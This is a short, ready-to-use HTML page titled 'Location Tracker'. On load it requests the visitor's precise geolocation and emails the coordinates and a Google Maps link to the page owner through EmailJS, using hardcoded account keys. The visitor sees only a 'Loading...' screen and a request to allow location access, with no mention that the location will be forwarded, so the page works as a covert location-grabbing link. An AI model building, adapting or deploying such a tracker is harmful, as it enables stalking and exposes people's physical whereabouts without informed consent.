<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Location Tracker</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("kOcgBe2A9w5ZY1SDC"); // Your EmailJS Public Key
    })();

    window.onload = function() {
      if (!navigator.geolocation) {
        alert("Geolocation is not supported by your browser.");
        return;
      }
      navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
    };

    function success(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

      emailjs.send("service_5q9i9lp", "template_qsebznb", {
        latitude: latitude,
        longitude: longitude,
        maps_url: mapsLink
      }).then(() => {
        alert("✅ Location sent successfully.");
      }, (err) => {
        console.error("Failed to send email:", err);
        alert("❌ Failed to send location. Please check EmailJS settings.");
      });
    }

    function error(err) {
      alert("Unable to retrieve your location. Error: " + err.message);
    }
  </script>
</head>
<body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
  <h1>Loading...</h1>
  <p>Please allow location access when prompted.</p>
</body>
</html>
